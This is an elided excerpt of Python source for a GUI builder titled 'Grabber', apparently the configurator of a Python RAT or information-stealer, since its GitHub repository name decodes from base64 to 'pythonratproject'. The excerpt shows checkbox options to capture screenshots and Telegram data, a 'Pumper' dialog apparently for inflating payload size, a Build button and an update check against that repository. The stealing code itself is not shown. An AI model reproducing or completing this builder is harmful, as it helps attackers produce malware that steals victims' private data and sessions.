		...
		if Settings.UpdatesCheck:
			...
			if os.path.isfile(hashFilePath):
				...
				try:
					...
					newhash = json.loads(http.request("GET", "https://github.com/chrisu-sudo/cHl0aG9ucmF0cHJvamVjdA/tree/main/extra/hash", timeout= 5).data.decode())["hash"]
...
class BuilderOptionsFrame(ctk.CTkFrame):
	...
	def __init__(self, master) -> None:
		...
		self.captureScreenshotCheckboxControl = ctk.CTkCheckBox(self, text= "Screenshot", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.captureScreenshotVar)
		self.captureScreenshotCheckboxControl.grid(row= 2, column= 3, sticky= "w", padx= 20)

		self.captureTelegramChecboxControl = ctk.CTkCheckBox(self, text= "Telegram", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.captureTelegramVar)
		...
		self.buildButtonControl = ctk.CTkButton(self, text= "Build", height= 38, font= self.font, fg_color= "#FFFFFF", hover_color= "#CFCFCF", text_color_disabled= "black", command= self.buildButtonControl_Callback)
...
class PumperSettings(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		...
		self.okButton = ctk.CTkButton(self, text= "OK", font= self.font, fg_color= "green", hover_color= "white", text_color_disabled= "white", command= self.ok_Event)
...
class Builder(ctk.CTk): # ui
	...
	def __init__(self) -> None:
		...
		self.titleLabel = ctk.CTkLabel(self, text= "Grabber", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#FFFFFF")
...
if __name__ == "__main__":
	...
	if os.name == "nt":
		...
		if Utility.CheckForUpdates():
			...
			if response:
				webbrowser.open_new_tab("https://github.com/chrisu-sudo/cHl0aG9ucmF0cHJvamVjdA/")
				exit(0)
